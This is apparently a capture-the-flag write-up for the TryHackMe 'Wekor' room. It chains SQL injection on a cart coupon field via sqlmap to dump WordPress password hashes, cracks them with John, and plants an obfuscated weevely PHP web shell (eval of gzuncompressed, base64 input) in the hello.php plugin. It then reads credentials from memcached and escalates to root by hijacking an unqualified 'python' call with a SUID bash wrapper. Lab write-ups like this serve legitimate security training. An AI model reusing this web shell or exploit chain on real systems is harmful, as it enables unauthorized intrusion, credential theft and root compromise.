THM - Wekor
===========
**Source:** [Tryhackme.com](https://tryhackme.com/room/wekorra)

Description
-----------

- CTF challenge involving `[SQLi]` , `[WordPress]` , `[vhost enumeration]` and `[recognizing internal services]`

Gathering Information
---------------------

initial scan | `Nmap` `gobuster`
--------------------------------
- [nmap.log](initial/nmap.log)

- [vhost](initial/vhost.gobust.log)

- [dir](initial/dir.gobust.log)

- [robots.txt](http://wekor.thm/robots.txt)

```sh
echo "machineip wekor.thm site.wekor.thm" >> /etc/hosts
```

Found wordpress dir on subdomain `site.wekor.thm/wordpress/` .

Use `wpscan` just got user `admin`

(KIV : Lack of Informations)

Hunting
-------

Start manual searching on `wekor.thm/it-next/`

>Since SQLi mentioned in desc. keep focus on : `query` `param` `request` `post-form`

>Useful Tools: Burspsuite / ZAP

Found `it_cart.php` has SQL error.

```
POST /it-next/it_cart.php HTTP/1.1
Host: wekor.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

coupon_code='  <!-- Got an error from here.
```
Using `sqlmap`.

```sh
sqlmap -u "http://wekor.thm/it-next/it_cart.php" --data="coupon_code=*" --banner --batch --dbs
```

Dump table `wp_users` from database `wordpress`
```sh
sqlmap -u "http://wekor.thm/it-next/it_cart.php" --data="coupon_code=*" --banner --batch -D wordpress -T wp_users --dump
```
By default dump output save at `~/.local/share/sqlmap/output/wekor.thm/dump/wordpress/wp_users.csv`

Ref: vuln file [SQLi](initial/sqli)

Recognizing password hash
-------------------------

>Hash with `$P$` = `phpass` 

Reference: [NameThatHash](https://nth.skerritt.blog/) | [GitHub](https://github.com/HashPals/Name-That-Hash)

JohnTheRipper my :heart:
----------------------------------
List users and passhash in a file.
example: `wpusers.hash`


```
admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.
```
Note: **all users on db is valid users.**

- John In Action

```sh
john --wordlist=/path/to/rockyou.txt --format=phpass wpusers.hash
```

- wordpress login page : `site.wekor.thm/wordpress/wp-login.php`

Get a shell by edit inactive plugins (my suggestion edit hello.php).
 

Note: This just optional. You can use your own shells

Example: im using weevely `weevely generate <yourpass> <path/to/outshell.php>`
```php
<?php
/*
Plugin Name: weevely 
Plugin URI: https://weevely.php/
Description: Just a shell
Version: 1.33.7
Author: anyone
Author URI: https://nyan.cat/
*/

$m='eYhNS83";f%%unction x($t%,$k){%$%c=strlen(%$k);$l%=strle%n($t);$%o=""%;f';
$v='or(%$i%=0;$i<$l;){fo%r($j%=0;($j<%$c&&$i<$l%);%%$j++,$i++){$%o.=$t{$%i}^$%';
$k='ents(%%"%php://inp%ut"),$m)=%=1%) {@ob_start()%;@ev%al(@gzun%compress(@x(@';
$G='$k="9c%dfb%439%";$kh="c7876e%703e30"%;$kf=%"7864%c9167%a15";$p="2%fw9spW%7m%';
$y=str_replace('di','','crediatdie_difudidinctdiion');
$q='ba%%s%%e64%_decod%e($m[1]),$k)))%;$o=@ob_get_cont%%ents();@ob_%e%nd_clean()';
$I=';$r%=@bas%e64_e%ncode(%@x(@gzc%ompr%ess($o),$%k%));p%r%int("$p$kh$r$kf");}';
$M='k{$j};}}ret%urn% $o;}if (%@preg_%ma%t%ch("/%$kh(.+)$kf%/",@f%ile_%g%et_cont';
$C=str_replace('%','',$G.$m.$v.$M.$k.$q.$I);
$X=$y('',$C);$X();

?>

```
shell path : `site.wekor.thm/wordpress/wp-content/plugins/hello.php` 

connect to shell weevely
```sh
weevely http://site.wekor.thm/wordpress/wp-content/plugins/hello.php yourpass
```

Priv Esc
--------

Start with user `www-data`

Hint in description room say : 
## `recognizing internal services`

List services that run locally.

```sh
ss -alp 
...
tcp    LISTEN     0      10     127.0.0.1:3010                  *:*                    
tcp    LISTEN     0      80     127.0.0.1:mysql                 *:*                    
tcp    LISTEN     0      128    127.0.0.1:11211                 *:*                    
tcp    LISTEN     0      128     *:ssh                   *:*                    
tcp    LISTEN     0      5      127.0.0.1:ipp                   *:*                    
tcp    LISTEN     0      128    :::http                 :::*                    
tcp    LISTEN     0      128    :::ssh                  :::*                    
tcp    LISTEN     0      5         ::1:ipp                  :::*   
...
```

- notice service `memcached` port= `11211` 

- references here : 
	- https://memcached.org/
	- https://github.com/memcached/memcached/wiki/UserInternals

- use `telnet` 

`stats items`
```sh
www-data@osboxes:/$ telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
stats items     
STAT items:1:number 5
STAT items:1:age 3740
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0
END
```
dump cached by run `stats cachedump 1 0`
```sh
...
stats cachedump 1 0
ITEM id [4 b; 1615475816 s]
ITEM email [14 b; 1615475816 s]
ITEM salary [8 b; 1615475816 s]
ITEM password [15 b; 1615475816 s]
ITEM username [4 b; 1615475816 s]
END
```
<!-- 
get username
VALUE username 0 4
Orka
END
get password
VALUE password 0 15
***************
END 
quit
-->

Now get the username password then quit telnet.

- ## `su Orka` 

- Run `sudo -l` to checking sudo priv.
```sh
sudo -l
[sudo] password for Orka: 
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```
- we can sudo as `root` for binary `bitcoin`.
	- cd to /home/Orka/Desktop/
	- Checking strings : `strings bitcoin`
	- Figure flow. (so you know its need `password` and what true 'password' right ?)
```sh
[^_]
Enter the password : 
password
Access Denied... 
Access Granted...
```
	- Flaw on here `[python] /home/Orka/Desktop/transfer.py`
	- 'python' is execute without full path which should be '/usr/bin/python' `/usr/bin/python -> python2.7`


## Investigate $PATH variable. 
```sh
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games	
```
	- we can write in /usr/sbin; first create suid bin.
	- Follow this step.

Copy bash binary
-----------------
```sh
install -m =xs $(which bash) /tmp/py
```
Create our 'python' bin
------------------------
'nano /tmp/py.c'
```c
#include <stdio.h>
#include <stdlib.h>
void main(){
    system("/tmp/py -p");
}
```
Compile it
-----------
`gcc -o /usr/sbin/python /tmp/py.c`

- Check all. make sure can execute.

```sh
ls -la /usr/sbin/python 
-rwxrwxr-x 1 Orka Orka 7348 Mar 11 12:51 /usr/sbin/python
```

Final Step
-----------

```sh
sudo /home/Orka/Desktop/bitcoin
[sudo] password for Orka: # user password
Enter the password : password # remember 'strings bitcoin'
Access Granted...
User Manual:			
Maximum Amount Of BitCoins Possible To Transfer at a time : 9  # read source '/home/Okra/Desktop/transfer.py'
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 7
```

# Now you got root privileges.

Have Fun ! Thanks for reading.

Any question can DM on [twitter](https://twitter.com/cornx_)

<!-- END -->